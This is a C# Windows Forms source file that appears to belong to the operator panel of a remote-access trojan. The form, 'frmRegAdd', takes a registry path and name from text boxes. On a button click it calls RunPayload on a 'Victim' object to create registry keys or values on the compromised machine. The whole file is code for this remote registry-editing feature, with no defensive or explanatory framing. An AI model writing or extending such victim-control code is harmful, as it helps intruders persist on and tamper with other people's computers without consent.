using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reception
{
    public partial class frmRegAdd : Form
    {
        public Victim v;
        public string path;

        public frmRegAdd()
        {
            InitializeComponent();
        }

        void setup()
        {
            radioButton1.Checked = true;
        }

        private void frmRegAdd_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            bool check = !radioButton1.Checked;
            comboBox1.Enabled = check;
            textBox2.Enabled = check;
            textBox3.Enabled = check;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string root_name = path.Split('\\')[0];
            string reg_path = path.Replace($"{root_name}\\", string.Empty);
            if (radioButton1.Checked) //KEY
            {
                v.RunPayload("RegEdit", v, new string[] { "nk", root_name, reg_path, textBox1.Text });
            }
            else //VALUE
            {
                v.RunPayload("RegEdit", v, new string[] { "nv", root_name, reg_path, textBox1.Text, comboBox1.Text, textBox3.Text });
            }
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
